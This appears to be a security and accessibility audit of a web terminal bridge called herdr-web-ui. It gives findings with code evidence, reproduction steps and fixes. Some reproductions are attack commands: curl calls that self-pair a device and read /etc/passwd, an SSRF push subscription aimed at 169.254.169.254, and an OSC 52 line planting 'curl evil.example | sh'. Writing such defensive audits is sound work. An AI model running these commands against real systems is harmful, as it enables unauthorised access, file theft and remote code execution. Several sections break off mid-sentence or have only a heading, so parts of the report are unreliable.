# Application audit — 2026-10-06

Cross-cutting audit of `herdr-web-ui` (Bun.serve bridge in `server/`, React 18 + xterm.js
client in `src/`, wire contract in `shared/`): security, concurrency and state integrity,
reliability and failure handling, accessibility, visual/interaction consistency, and
responsive/edge-case behaviour. Every finding below was traced to code in the tree at
`29ea99a`; nothing was modified.

Scope notes that shape the whole report:

- The app is a **bridge**, not a multi-tenant service. herdr owns every pty, scrollback and
  agent state. The trust model is explicitly single-user: an authenticated "drive" client is
  equivalent to the server's own uid (S12). Several findings are therefore rated for *how a
  real user gets hurt* rather than for tenant isolation.
- Access levels are `full`/`none`, with an optional `watch` role on paired devices.
  Authentication paths: shared token (`HERDR_WEB_TOKEN`), paired device cookie
  (`herdr_web_device`, sha256 at rest), Tailscale owner login (loopback only), loopback, and
  "open" — which is the subject of S1.
- Two candidate findings were investigated and **rejected** rather than reported. A claimed
  timeout mismatch on remote-PC workspace creation (the machine proxy's 75 s versus a
  purported 150 s grant) does not exist: `server/index.ts:1224` grants 75 s for
  `workspace/create` with an agent, matching the proxy's 75 s — the 150 s grant at
  `server/index.ts:1321` belongs to `worktree/create`, which the proxy already covers with
  165 s/180 s. And a reported `--danger` token used-but-never-defined was a grep artifact:
  only `--danger-text` and `--danger-tint` are used, and both are defined.

Findings are grouped by severity, then category. IDs are stable: `S` security, `RC` race
condition, `RL` reliability, `A` accessibility, `V` visual consistency, `R` responsive,
`P` performance.

| Severity | Count | Findings |
|---|---|---|
| Critical | 0 | none |
| High | 2 | S1 (open-LAN self-pairing), A1 (terminal invisible to screen readers) |
| Medium | 10 | S2, S3, S4, V1, V2, V3, A2, A3, A4, A5 |
| Low | 24 | S5–S11, RC1–RC4, RL1–RL2, P1–P2, R1–R2, V4–V7, A6–A8 |
| Informational | 11 | S12–S13, S14–S15, R3, RL3–RL5, V-doc, V8, V9 |

Forty-seven findings in total. The two that gate the release recommendation are S1 and A1; the
Medium band is defence-in-depth and interaction polish, and the Low band is almost entirely
one-to-four-line fixes. What the audit *did not* find is recorded near the end and is worth as
much weight as what it did.

---

# Critical

None found. No unauthenticated remote code execution, no injection into the shell/SSH paths,
no path traversal, and no XSS sink reachable from agent output. The command-construction
surfaces (`server/ssh.ts` `shellQuote`, `server/remote-host.ts` `cmdValue`/`psQuote`,
`server/pty/pty-host.mjs` argv) quote or reject every interpolated value, the machine proxy
only ever fetches a loopback-forwarded port with `redirect: "error"` and a header allowlist,
and the only `dangerouslySetInnerHTML` on agent-controlled content is KaTeX output with `trust`
left at its safe default (S3 covers why its `strict` setting still warrants a CSP).

# High

## S1 — Security — "Open LAN" mode hands full control to anyone who can reach the port, and lets a LAN peer self-pair into a persistent device

**Location:** `server/access.ts` `decideAccess` (the `!gated && !funnel` → `open` branch),
`server/index.ts:371` and `:2037-2039` (bind default and startup warning),
`server/devices.ts:234-236` (`/api/devices/pair/start`), `server/devices.ts:218-227`
(`/api/devices/pair`).

**Issue.** When no `HERDR_WEB_TOKEN` is configured and no device has been paired,
`decideAccess` returns `{ level: "full", via: "open", role: "drive" }` for every client that
is not loopback and did not come through Tailscale Funnel. Until someone pairs a device the
server has **no authentication at all** for the whole API surface: session listing, pane
read/write, terminal input, `/api/fs/*` reads of anything the uid can read, and device
management. The console warning at startup says so, but nothing defaults to deny.

The window is worse than read-once, because pairing itself is reachable from inside it:
`/api/devices/pair/start` is guarded only by `sameOrigin(request)` and the
`x-herdr-machine: 1` header (`server/index.ts:1041` exempts `/api/devices/pair` from the
mutation gate; `server/devices.ts:232` applies the header check *after* the pair route). Both
are satisfied by any non-browser client — `Origin` is a self-set header, and `sameOrigin()`
returns `true` when it matches. So a LAN peer can:

1. `POST /api/devices/pair/start` → receive a 6-digit code,
2. `POST /api/devices/pair` with that code → receive a `herdr_web_device` cookie for a
   `drive`-role device of their own label,
3. keep that cookie for a year (`Max-Age` 1 year in `server/auth.ts`), after which `gated` is
   true and the "open" branch is dead for everyone else.

**Impact.** Anyone on the same network (home Wi‑Fi, office, coffee shop, conference VLAN) gets
full terminal control of every pane, arbitrary file read as the server's uid, and a persistent
credential that survives the window. Keystrokes into a live agent pane are the worst case: the
attacker types into a shell that already has the user's credentials and repo access, with no
login required and no trace in herdr's own session.

**Evidence.**

```ts
// server/access.ts
if (!input.gated && !input.funnel) return { level: "full", via: "open", role: "drive" };
```

```ts
// server/devices.ts — the pair route is handled before the mutation/origin gate
if (pathname === "/api/devices/pair") { … const paired = store.pair(body["code"], …, "drive"); … }
if (pathname === "/api/devices") { … }
if (!sameOrigin(request) || request.headers.get("x-herdr-machine") !== "1") return …403;
if (access.level === "full" && access.role === "watch") return …403;
if (pathname === "/api/devices/pair/start") { … return jsonResponse(store.startPairing(), 200 …); }
```

**Reproduction.**

```bash
# PC A (no token set, no devices paired)
HOST=0.0.0.0 PORT=3000 bun run server/index.ts
# PC B on the same LAN
H=http://<A-LAN-IP>:3000
CODE=$(curl -s -X POST -H "Origin: $H" -H "x-herdr-machine: 1" $H/api/devices/pair/start | jq -r .code)
curl -s -i -X POST -H "Origin: $H" -H "x-herdr-machine: 1" \
  -H "content-type: application/json" -d "{\"code\":\"$CODE\"}" $H/api/devices/pair
# → 204 with Set-Cookie: herdr_web_device=… ; persistent drive access
curl -s -H "Cookie: herdr_web_device=…" $H/api/session            # full session state
curl -s -H "Cookie: herdr_web_device=…" "$H/api/fs/file?path=/etc/passwd"
# and a WebSocket to /ws with the same cookie accepts `input` frames
```

**Recommended fix.** Default-deny: never answer `level: "full"` for a non-loopback client
without a matched token or device — require `HERDR_WEB_ALLOW_OPEN=1` (or a CLI flag) to opt
into the current behaviour, and keep the warning for that case. Separately, make pairing
*initiation* available only to a session that is already an owner (loopback, token, or an
existing `drive` device), so a stranger in the open window cannot mint a persistent
credential. Pairing *completion* staying public is fine.

**Confidence:** Confirmed — the code path is traced end to end and the reproduction is
deterministic.

## A1 — Accessibility — The terminal, the product's central surface, is invisible to screen readers

**Location:** `src/components/PaneTerminal.tsx:1548` (the xterm host), `:325-337` (the
`Terminal()` options), `patches/@xterm+xterm@5.5.0.patch:31`.

**Issue.** xterm's host is a bare `<div className="pane-terminal…">` with no `role`, no
`aria-label` and no `aria-roledescription`. The `Terminal()` construction sets `convertEol`,
`cursorBlink`, `scrollback: 0`, `allowProposedApi`, `fontSize`, `fontFamily`, `theme` and
`linkHandler` — but never `screenReaderMode`, even though the bundled patch reads
`this.optionsService.rawOptions.screenReaderMode`, so the option exists and is consumed by
shipped code. Both usual fallbacks are structurally closed: `scrollback: 0` is an intentional
`AGENTS.md` invariant (herdr owns scrollback), and the wheel handler routes mouse-report
events rather than scrolling, so scrollback review is impossible by design.

**Impact.** WCAG 2.2 SC 1.1.1, 4.1.2 and 2.1.1. A screen-reader user cannot perceive the
primary surface at all: focus cannot land on it with any meaningful announcement. The chat
lens (`role="log"` in `ChatView.tsx:862`) is a genuine alternative, but it is a separate view
a user has to know to switch to, and it folds raw terminal output behind a `<details>`
element (`ChatView.tsx:891`).

**Evidence.**

```tsx
// src/components/PaneTerminal.tsx:1548
<div className={`pane-terminal${paneId === null ? " is-idle" : ""}`} ref={hostRef} />
```

```diff
// patches/@xterm+xterm@5.5.0.patch:31 — shipped code reads the option
+      && !this.optionsService.rawOptions.screenReaderMode;
```

**Reproduction.** With VoiceOver or NVDA, open a pane with a running agent. Focus cannot land
on the terminal with any meaningful announcement. Switch to the chat view and the same pane
reads correctly.

**Recommended fix.** Two parts, and only the first is trivial:

1. `role="region"` + `aria-roledescription="terminal"` + a dynamic `aria-label` derived from
   the pane's title state.
2. Evaluate `screenReaderMode: true` — this is the real fix. It needs validation, not a
   flag-flip: the patch branches on that option for its Gboard backspace guard (which behaves
   differently under the flag), and the repo already carries IME-composition guards
   (`isComposing`, keyCode 229) showing this class of bug is real in this codebase. Scrollback
   review is a herdr-side concern, not something xterm can provide.

**Confidence:** Confirmed.

# Medium

## S2 — Security — Internal error messages are echoed verbatim in 500 responses

**Location:** `server/http.ts:18-22` `errorResponse`.

**Issue.** Any exception that is not a `HerdrError` is returned to the client as
`{ error: { code: "internal_error", message: <raw error.message> } }` with a 500. Node/Bun
system errors embed absolute filesystem paths (`ENOENT: no such file or directory, open
'/home/…/.config/herdr/…'`, `EACCES`, `ENOTDIR`), the herdr socket path, and anything a
dependency throws. Every route that can throw non-`HerdrError` is a disclosure channel,
including GETs available to `watch` devices (`/api/session`, `/api/pane/read`,
`/api/workspace/directories`), which otherwise see a carefully limited surface.

**Impact.** Filesystem layout, home directory, herdr socket location and dependency internals
leak to the least-privileged client class, and directly assist targeting `/api/fs/file` (S12).

**Evidence.**

```ts
const message = error instanceof Error ? error.message : String(error);
return jsonResponse({ error: { code: "internal_error", message } }, 500);
```

**Reproduction.** Any route whose handler hits an unexpected filesystem state — a directory
passed to `/api/fs/file`, or a pane whose cwd has vanished — answers with the raw system
message instead of a generic one.

**Recommended fix.** Answer a fixed `internal_error` message, log the real exception
server-side with a short random correlation id echoed in the response. Keep the `HerdrError`
branches as they are — those messages are authored, not leaked.

**Confidence:** Confirmed.

## S3 — Security — No Content-Security-Policy on the SPA shell or on served HTML

**Location:** `index.html` (no CSP meta tag), `server/static.ts` (no CSP header). The only CSP
in the codebase is the sandbox applied to inline non-PDF file content at
`server/file-view.ts:102`.

**Issue.** The application renders content produced by third parties: agent markdown in chat,
terminal output, and files opened in the viewer. React escapes text and
`src/lib/markdown.ts`'s `safeMarkdownHref` restricts link hrefs to `http(s)://` and `mailto:`,
so **no XSS path was found**. But the two places that bypass React escaping both deserve a
backstop:

1. `src/components/Markdown.tsx:39` renders KaTeX output through
   `dangerouslySetInnerHTML`. The call passes `strict: "ignore"`, which downgrades KaTeX's
   unknown-command guard from *error* to *render anyway* — the guard exists to stop malformed
   TeX producing unexpected markup, and it is deliberately disabled. (`trust` is left at its
   default, so `\href`/`\includegraphics` stay refused; that is what keeps this from being a
   live hole.)
2. `src/components/AgentMark.tsx:151-156` (`SvgMark`) injects hardcoded SVG bodies from
   `src/components/agentSvgMarks.ts` — safe today because the bodies are constants, but a
   future addition there is one edit away from script execution.

Without a CSP, any future parser bug in either place runs script in the app's origin. The auth
cookie is `HttpOnly`, so it cannot be read — but the attacker's script can still drive
`/api/*` and the WebSocket as the user, which is the whole application.

**Impact.** No current exploit; the finding is the missing mitigation layer. Blast radius if
any injection ever lands: full session takeover.

**Recommended fix.** Ship a restrictive CSP, measuring first with
`Content-Security-Policy-Report-Only` from `serveStatic` (a header, not a `<meta>` tag — the
header also covers the file viewer). Inline styles are used widely, so `style-src 'self'
'unsafe-inline'` will be needed initially; script is entirely bundled, so `script-src 'self'`
should be reachable. Revisit `strict: "ignore"` on KaTeX at the same time — the `catch`
fallback already renders the source form, so `strict: true` costs nothing but strictness.

**Confidence:** Confirmed (absence of the control); impact is reasoned, not demonstrated.

## S4 — Security — Web-push subscriptions may target plain `http:` URLs, giving any watch device a blind-POST primitive from the server's network position

**Location:** `server/push.ts:132-142` `parseSubscription`, `server/index.ts:1040`
(`ownPreferences` allowlist), `server/push.ts:213` `deliver` (plain `fetch`).

**Issue.** `parseSubscription` accepts `http:` as well as `https:` endpoints. Browsers only
ever hand a web-push subscription on `https:` (or `http://localhost` for local dev), so a
plain-`http` endpoint is never a legitimate value — but it is exactly what turns the push
sender into a server-side request forger:

- `/api/push/subscribe` and `/api/push/test` are listed in `ownPreferences`
  (`server/index.ts:1040`), which means the `watch` role — the least privileged class, the one
  the whole `read_only` block exists to constrain — *can* register an arbitrary URL and *can*
  trigger a send to it.
- `deliver()` POSTs to that URL from the server itself, i.e. from inside the user's network,
  reaching hosts a browser page never could: `169.254.169.254`, router admin pages, internal
  services, other VLANs.

The body is a fixed RFC 8291 blob encrypted for the declared `p256dh`/`auth` keys, so the
attacker neither controls the content nor can read the response. That bounds the damage to a
blind POST with a fixed body — still enough for internal service probing and request
amplification, and exactly the primitive the `watch` role should not have.

**Evidence.**

```ts
// server/push.ts
const url = new URL(endpoint);
if (url.protocol !== "https:" && url.protocol !== "http:") return null;
```

```ts
// server/index.ts
const ownPreferences = pathname === "/api/auth" || pathname === "/api/push/subscribe" || pathname === "/api/push/test";
if (readOnly && (fileRead || mutating && !ownPreferences)) return …403 read_only;
```

**Reproduction.** Pair a device with the `watch` role; from that device
`POST /api/push/subscribe` with
`{"subscription":{"endpoint":"http://169.254.169.254/latest/meta-data/","keys":{"p256dh":<65 bytes>,"auth":<16 bytes>}}}`
(both base64url, lengths validated) then `POST /api/push/test`. The server issues the POST.

**Recommended fix.** Require `https:` in `parseSubscription` (allow `http://localhost`/`127.0.0.1`
only behind a dev flag, or not at all). Independently, decide whether push management really
belongs in `ownPreferences` for `watch` devices — subscribing to alerts is a preference, but
the endpoint is attacker-supplied input.

**Confidence:** Confirmed.

## V1 — Visual consistency — `RowMenu` never caps its height, so a long menu is clipped by the viewport and its lower items are unreachable

**Location:** `src/components/RowMenu.tsx:75-77` (placement math), `src/components/RowMenu.css`,
`src/styles.css` `.menu { overflow: hidden }`, `src/components/TabStrip.tsx:238-253`.

**Issue.** `left` is clamped to the viewport and the menu flips above the anchor when it
cannot fit below, but nothing caps `offsetHeight`: `.menu` is `overflow: hidden` and
`.row-menu` has neither `max-height` nor `overflow-y`. The tab-strip pane picker renders one
item per pane and is unbounded.

**Impact.** Roughly twenty panes in one tab on a normal laptop viewport makes the menu taller
than the screen; items past the fold are rendered but unreachable, with no scroll. Keyboard
arrows still move to them in the DOM while they stay invisible, so the keyboard and the
pointer disagree.

**Evidence.** Both other portal popovers do it right: `src/components/AgentPicker.tsx:91` sets
`maxHeight: Math.min(320, room)` inline with `overflow-y: auto`, and `CommandPalette.css` and
`.header-more-crumb` cap their heights too.

**Reproduction.** Give a tab about twenty panes, open its picker from the tab strip; the lower
pane entries are cut off and unreachable.

**Recommended fix.** Cap the height from the available room and scroll, exactly as
`AgentPicker` does.

**Confidence:** Confirmed.

## V2 — Visual consistency — `MachineDialog` is the only native `<dialog>`, so it never becomes a bottom sheet on phones

**Location:** `src/components/MachineDialog.tsx:60`, `src/components/Machines.css:139-147`,
`src/styles.css:1177-1188` and `:1200-1204`.

**Issue.** Every other dialog renders `.modal-scrim > .modal`. The phone bottom-sheet rule and
the `[data-keyboard]` rule both key off `.modal-scrim`, which this dialog has no ancestor of,
and `Machines.css` has no `max-width: 640px` override at all (only two `prefers-reduced-motion`
blocks).

**Impact.** On a phone, "Add PC" / "Reconnect PC" / "Update remote bridge" stay centered with
a 24px margin and no safe-area bottom padding while every other dialog is a bottom sheet —
and on a phone with the keyboard up, the sheet's keyboard accommodation does not apply either.

**Evidence.**

```tsx
// src/components/MachineDialog.tsx:60 — no .modal-scrim ancestor
<dialog ref={dialog} className="modal machine-dialog" aria-labelledby="machine-dialog-title" …>
```

```css
/* src/styles.css:1177 — keyed on the scrim this dialog lacks */
@media (max-width: 640px) { .modal-scrim { align-items: flex-end; padding: 0; } … }
```

**Reproduction.** On a phone (or a narrow browser), open Settings → Remote PCs → Add PC; it
appears as a centered card while New workspace and Settings open as sheets.

**Recommended fix.** Render it as `.modal-scrim > .modal` like the rest, or replicate the
sheet rules in `Machines.css` at `max-width: 640px`.

**Confidence:** Confirmed.

## V3 — Visual consistency / i18n — Three user-visible strings bypass `t()` entirely, so they are permanently untranslated

**Location:** `src/components/ChatView.tsx:897`, `src/components/UpdateControls.tsx:50`,
`src/components/MachineSidebar.tsx:81`; blind spot in `src/lib/i18n.test.ts`.

**Issue.** Three literals are rendered without `t()`:

```tsx
// ChatView.tsx:897 — inside a role="alert", the worst place for an untranslated string
{errorStatus === 401 ? "locked — the token gate is asking again" : error}

// UpdateControls.tsx:50 — also passes no locale to Intl, unlike DevicesPanel.tsx:38
{status?.checked_at && <p className="settings-hint">Last checked {new Date(status.checked_at).toLocaleString()}</p>}

// MachineSidebar.tsx:81 — translations EXIST for these and are still not applied
<span className="machine-state-word">{STATE_WORD[machine.state]}</span>
```

The third is the clearest defect: `i18n.test.ts:65` explicitly grabs `STATE_WORD`'s values and
checks them against the locale dictionaries, so ko/ja/zh translations *are* maintained — but
the render site ignores them. Line 74 applies `t(STATE_WORD[…])` to the status dot's `title`,
which is `aria-hidden` and a tooltip only; the visible word on line 81 is raw English. (By
contrast `STATUS_WORD` in `src/lib/status.ts` is correctly wrapped at `Sidebar.tsx:64-65`.)

None of these is caught by the i18n test: it scans only the first argument of `t()` calls, so
an unwrapped literal is structurally invisible to it — neither missing nor unused, just absent.

**Impact.** Korean, Japanese and Chinese users get English in the machine sidebar's state word,
in Settings → Updates' "Last checked" line (with a browser-default-locale date besides), and
inside an assertive chat error.

**Reproduction.** Set the language to 한국어 and open the sidebar of an offline PC, or Settings
→ Updates; or trigger a 401 on the chat. The strings are English.

**Recommended fix.** Wrap all three in `t()`, add the dictionary entries, and pass
`currentLocale()` to `toLocaleString()`. The harder follow-up is catching bare JSX literals in
the test — a scan for text nodes outside `t()` would need to allow the legitimate exceptions
(key caps like `Alt`/`Home`, agent-supplied text), so it is a follow-up rather than part of the
fix.

**Confidence:** Confirmed.

## A2 — Accessibility — Four dialogs declare `aria-modal="true"` but impose no Tab trap

**Location:** `src/components/SettingsDialog.tsx:219`, `src/components/CommandPalette.tsx:173`,
`src/components/FileViewer.tsx:117`, `src/components/NewSessionDialog.tsx:131`
(`FilesDialog.tsx:27` has the same shape).

**Issue.** Nothing contains Tab/Shift+Tab in these. `aria-modal` tells assistive technology
that the background is inert, but browsers do not enforce that for the *keyboard* — only the
focus trap does. `ConfirmDialog.tsx:81` traps Tab (cycling Cancel/Confirm with
`preventDefault`, holding focus on the surface while its buttons are disabled);
`RowMenu.tsx:155` traps Tab in its mobile sheet; `MachineDialog` uses native
`<dialog>` + `showModal()`, which traps natively. So this is drift, not a design decision.

**Impact.** SC 2.4.3. Tab escapes the dialog into background controls that AT reports as
inert. Most acute for the command palette, opened constantly via `Mod+Shift+K`, and for the
long Settings dialog.

**Reproduction.** Open Settings, press Tab repeatedly — focus lands on the header buttons,
sidebar rows and terminal behind it.

**Recommended fix.** Lift `ConfirmDialog`'s trap into a `useFocusTrap` wrapper and apply it to
all four (plus `FilesDialog`). Do not "fix" `RowMenu`: its asymmetry — Tab closes the desktop
popover and is trapped in the mobile sheet — is documented and intentional.

**Confidence:** Confirmed.

## A3 — Accessibility — Focus is not returned to the opener when a dialog or palette closes

**Location:** `SettingsDialog`, `CommandPalette`, `NewSessionDialog`, `FileViewer`.

**Issue.** None record the opener or restore focus. `CommandPalette` focuses its input via
`requestAnimationFrame` on open only; `FileViewer` has no `focus()` call at all. `RowMenu`
records its anchor and returns focus in a `useLayoutEffect` cleanup; `ConfirmDialog` records
the opener and refocuses on unmount unless `done`; `UsageMeters.tsx:113` refocuses its strip
on Escape.

**Impact.** SC 2.4.3. After Escape the user lands on `<body>`, losing their place in a long
settings list or a busy sidebar. Most acute for the palette, which is opened from arbitrary
controls and dismissed constantly.

**Reproduction.** Focus any control, open the palette, press Escape — focus is on `body`.

**Recommended fix.** Reuse the `ConfirmDialog`/`RowMenu` pattern: capture
`document.activeElement` on mount, restore it in the cleanup of the same effect.

**Confidence:** Confirmed.

## A4 — Accessibility — `TabStrip` declares a tablist/tab pattern with no `aria-controls` and no tabpanel counterpart

**Location:** `src/components/TabStrip.tsx:258` (tablist), `:288-307` (each tab).

**Issue.** The mechanics that are implemented are done carefully: roving tabindex,
`aria-selected`, `tabIndex={active ? 0 : -1}`, ArrowLeft/Right/Home/End at `:214-231`, F2
rename, Delete close, and real focus hand-off when a tab closes (`:90-98` → the tab beside
it, or `focusWorkspaceListToggle()`). But no tab carries `aria-controls`, and there is no
`role="tabpanel"` anywhere in `src/`.

**Impact.** SC 4.1.2. Assistive technology following the APG tablist pattern cannot relate a
tab to the panel it governs. Keyboard interaction is fine — this is an AT-relationship gap,
not an interaction gap.

**Reproduction.** With a screen reader, arrow through the strip: `aria-selected` announces, but
there is no programmatic link to the pane region it selects.

**Recommended fix.** `aria-controls` on each tab pointing at the pane container's id, and give
that container `role="tabpanel"` with an `aria-label` from `tabLabel`/`customTabLabel`
(`:69`). Or, if a full tabpanel is judged too heavy for a one-pane-at-a-time layout,
downgrade the strip to a button group — but the half-state should not stay.

**Confidence:** Confirmed.

## A5 — Accessibility — Agent-authored `h1`–`h6` breaks the page's heading outline

**Location:** `src/components/Markdown.tsx` (the heading branch, real `h1`–`h6` from
`block.level`), rendered inside `src/components/ChatView.tsx:856` (`role="log"`).

**Issue.** The app's own outline is deliberate and correct — `Brand()` renders the single
`h1` (`App.tsx`), `MachineDialog` an `h2` with `id="machine-dialog-title"`, `SettingsDialog`
an `h2` with `id="settings-title"`, `AccessGate` an `h1`, `NeedsInput` and
`DirectoryBrowser` an `h2`. But agent markdown headings pass through as-is, including `h1` and
`h2`.

**Impact.** SC 1.3.1. Heading navigation lands on agent content presented as document
structure, shadowing the real outline. Agents write `#` and `##` constantly, so this is not
theoretical.

**Reproduction.** Open a chat where the agent replied with a heading; VO+U / NVDA's heading
list shows agent headings as page structure alongside the app's own.

**Recommended fix.** Remap agent heading levels to `h3` (below the app's `h1`/`h2`) or to a
`<p>` with a weight class — visual styling unchanged. A heading inside `role="log"` is the
specific thing to avoid.

**Confidence:** Confirmed (mechanism); high confidence on the SC mapping.

# Low

## S5 — Security — No rate limiting or lockout on token authentication

**Location:** `server/auth.ts` `handleAuthRequest` / `isAuthenticated`,
`server/index.ts:1088`.

**Issue.** `POST /api/auth` has no attempt counter, no backoff and no lockout. The comparison
is timing-safe, so there is no oracle — but an attacker who can reach the server can guess a
weak user-chosen token without bound. Pairing codes, by contrast, are handled well: 6 digits,
10-minute TTL, 5 attempts (`server/devices.ts`), so the pairing path is not the weak one.

**Impact.** Low: real tokens are long random strings, and reaching the endpoint already
requires passing the access gate. The gap matters only for users who set a short or guessable
`HERDR_WEB_TOKEN`.

**Recommended fix.** A small per-IP attempt budget with exponential backoff on `/api/auth`
failures, resetting on success. A dozen lines, and it closes the last unbounded guessing
surface.

**Confidence:** Confirmed.

## S6 — Security — `sameOrigin()` treats an absent `Origin` header as same-origin

**Location:** `server/machine-security.ts:16-27`.

**Issue.** The CSRF check returns `true` when `Origin` is absent — documented as necessary so
CLI clients can still use the custom mutation header. Browsers always attach `Origin` on a
cross-origin `fetch`/form POST, and the session cookie is `SameSite=Strict`, so a
browser-driven forged request is double-defended and **no exploit chain was found**. The
finding is the assumption itself: it means the origin check is not a complete control, and it
silently degrades if anything in the chain strips the header (some extensions and
non-standard browsers do).

**Impact.** Low. Without a cookie to ride, a header-spoofing client gains nothing; with
`SameSite=Strict`, a cross-site page cannot ride the cookie either.

**Recommended fix.** When the request carries a session/device cookie and no `Origin`, treat
it as cross-site — browsers always send one in that situation, so only non-browser clients are
affected, and they already need the custom header.

**Confidence:** Confirmed (behaviour); high confidence that exploitability is low.

## RC1 — Race condition — Two tabs on one pane can send the same message

**Location:** `src/lib/composerDraft.ts:56-63` (`begin`/`end`), `src/components/Composer.tsx:620-657`.

**Reproduction.** Open the same pane in two tabs, send in A, focus B, send.

**Recommended fix.** Persist the sending state (or the sent prefix) so a second tab sees the

## RC2 — Race condition — The `input` handler's mirror/RPC branch skips the attach-membership check

## RC3 — Race condition — An attach can join a pty attachment that already died and never receive `pty-exit`

**Location:** `server/index.ts:1713-1748`, `:562-577` (`closeAttachment`).

**Issue.** The handler records the pane in `client.data.attached` before `await
ensureAttachment` (correctly — a detach or close during the lookup must cancel the attach) but
joins `attachment.clients` only after it. If the pty exits in that window, `closeAttachment`
clears the pane for *existing* members only; the client then passes the post-await
`client.data.attached.has(...)` check and joins an attachment whose pty is already gone, after
the `pty-exit` broadcast. The mirror case is already guarded at `:1730-1735`; the pty case is
not.

**Impact.** A terminal that never says it ended until the collector's pane-exited broadcast and
the debounced refetch move the selection off it — a few seconds of a dead pane looking live.

**Recommended fix.** After the await, require `attachments.get(paneId) === attachment` (and
that the pty has not exited) before joining, mirroring the existing mirror check.

**Confidence:** High confidence — the window and the missing guard are both visible in the
code; the timing is narrow enough that I would call it confirmed-in-code rather than
observed-in-use.

## RL1 — Reliability — The Windows mirror's poll loop dies silently if post-read work throws

## P1 — Performance — Server transcript caches are keyed by path and never released; the pi index holds the whole parsed file for the process lifetime

**Location:** `server/pi-tree.ts:39` (`piIndexes`), `server/conversation.ts:231` (`cache`),
`:304` (`transcriptRevisions`), `:380` (`clearScans`), `:511` (`liveScans`), `:529`
(`settledTurns`), `:585` (`codexTurns`), `server/codex.ts:250/373/453/467/747/831`,
`server/claude-store.ts:45` (`found`), `server/gjc-runtime.ts:78/131`.

**Issue.** The transcript readers cache parsed state in module-global `Map`s keyed by file path
or pane id. Two are bounded by LRU-ish eviction (`conversation.ts:968` caps `cache` at 32, and
`remember()` at `:535-538` takes a `limit`); the rest have **no eviction at all**, and the only
clearing path, `forgetTranscriptState()` (`conversation.ts:673-683`), is called by the test
suite. Nothing runs when a pane closes, so an entry survives as long as the server does.

The unbounded one with the largest footprint is `piIndexes`: `buildIndex`/`extendIndex` append
one `PiEntry` per transcript record and the index is kept for good, so it holds a parsed entry
— id, parent, byte range, type, role and the record's `summary` string — for **every record in
the entire file**, plus a `children` map. `historyChains` (`codex.ts:453`) is similarly "kept
for good" per rollout path, and `questionScans` (`codex.ts:373`) keeps an `asked` list and an
`answered` set per file.

**Impact.** Growth is bounded by *panes ever opened × each transcript's full length*, not by
live panes. On the local server that is a restart every so often. On a **remote bridge** it
matters more: `server/remote-entry.ts` deliberately keeps the process alive across disconnects
(WMI-detached so it outlives every bridge restart), so a PC that runs agents for weeks holds
every transcript it ever read as parsed objects. This is a slow leak, not a fast one.

**Recommended fix.** Release a pane's entries when it closes — `paneClose` already returns, so
a `forgetTranscriptState(paneId)`-shaped call from the close handler would do it. Independently,
give `piIndexes` a windowed index (the conversation readers prove the pattern: keep the newest
page, re-scan the head on demand) or at minimum the same `remember()` eviction.

**Confidence:** Confirmed (retention is direct from the code); the memory figure is reasoned
from per-record size, not measured.

## R1 — Responsive — `RowMenu` picks sheet-vs-popover once, at mount, and never follows the viewport after that

**Location:** `src/components/RowMenu.tsx:51` and `:60`.

**Issue.** Whether a row menu renders as a bottom sheet or a positioned popover is decided by
`useState(() => window.matchMedia(SHEET_QUERY).matches)` — read once when the menu opens and

**Impact.** A menu open while the viewport crosses the 640px breakpoint keeps its original

tab's ⋯ menu open, dragging an Android multi-window divider, Samsung DeX / iPad Stage Manager
resize, or resizing a desktop browser while a menu is up. Menus are transient, so this is a
visible glitch rather than a trap.

**Evidence.**

```ts
const SHEET_QUERY = "(max-width: 640px)";
…
const [sheet] = useState(() => window.matchMedia(SHEET_QUERY).matches);
```

**Reproduction.** Narrow the window below 640px, open any row menu (a tab's ⋯, a sidebar row),

**Recommended fix.** Use the existing subscribed `useMediaQuery(SHEET_QUERY)` in place of the

**Confidence:** Confirmed.

## S8 — Security — An OSC 52 clipboard write from a pane is applied with no confirmation

**Location:** `src/components/PaneTerminal.tsx:685-692` (the `OSC` handler in the attach-stream
parser).

**Issue.** The terminal stream parser honours OSC 52 (the clipboard set escape sequence). A pane
that emits `\x1b]52;c;<base64>\x07` writes to `navigator.clipboard` with no prompt and no
user gesture. Any process running in the pane — including an agent's tool calls — can set the
clipboard.

**Impact.** Low. The pane's own process is already trusted with everything the user types into
it, and clipboard writes from a focused page are not new capability in the browser sense. The
realistic harm is a paste-poisoning sequence: a pane plants a string the user then pastes into a
password field or a shell elsewhere, or a URL the user pastes into the address bar. xterm's own
docs treat this sequence as requiring user opt-in for exactly this reason.

**Evidence.** `PaneTerminal.tsx:685-692` calls the clipboard writer directly on the parsed OSC 52
payload; nothing between the escape sequence and the write asks the user.

**Reproduction.** In a pane, run `printf '\x1b]52;c;%s\x07' "$(printf 'curl evil.example | sh' | base64)"`,
then paste anywhere.

**Recommended fix.** Gate the write behind a setting (off by default, or prompt-once-per-pane), or
restrict it to a copy action the user initiated. At minimum, document the behaviour — several
terminal emulators ship it disabled by default.

**Confidence:** Confirmed for the mechanism; the paste-poisoning step is High Confidence rather
than observed.

## S9 — Security — Text typed while disconnected is persisted to `localStorage` indefinitely,
including text typed at a password prompt

**Location:** `src/lib/draft.ts:7-36` (`InputDraft`, `MAX_DRAFT_CHARS = 1024`),
`src/components/PaneTerminal.tsx:220-223` (the persistence effect), `:1169` (the restore read).

**Issue.** While the socket is down, printable keystrokes fold into a draft and the effect at
`:220-223` writes it to `localStorage` under `herdr-web-ui:terminal-draft:<machine>:<pane>` on
every change. Nothing expires it and nothing clears it once the text is finally sent —
`draftIsEmpty` is the only removal condition, so the draft survives until the user reconnects and
sends or deletes it, and it survives a page reload in between.

**Impact.** Low. `localStorage` is same-origin and the app stores no token client-side (see "What
the audit looked for"), so this is not a credential exposure. The exposure is what the user typed
into the terminal while offline: at a `sudo` password, an SSH passphrase or a herdr token prompt,
that text is written to disk in the browser profile and kept past the moment it was needed. The
1024-char cap bounds it, and the draft policy itself (never queue blind input) is a deliberate
and correct design — the persistence layer is the only unconsidered part.

**Evidence.** `draft.ts:28-31` accumulates printable text; `PaneTerminal.tsx:222` writes the
JSON-serialised draft to `localStorage` with no expiry or post-send wipe; `:1169` reads it back on
mount.

**Reproduction.** Disconnect the network while a pane is at a `sudo` prompt, type the password,
reload the page, and inspect `localStorage` — the draft is still there. Reconnect and send it and
the entry is removed; the window of exposure is the offline period plus any reload in it.

**Recommended fix.** Wipe the draft when it is handed to the socket (it already becomes empty
then, so this mostly already happens — confirm the path covers a send that fails), and consider
not persisting at all while the pane's prompt is a known-secret context. An expiry on read is a
cheap backstop.

**Confidence:** Confirmed for the persistence and the reload survival; the "at a password prompt"
case is High Confidence, since the app cannot know what the pane is asking.

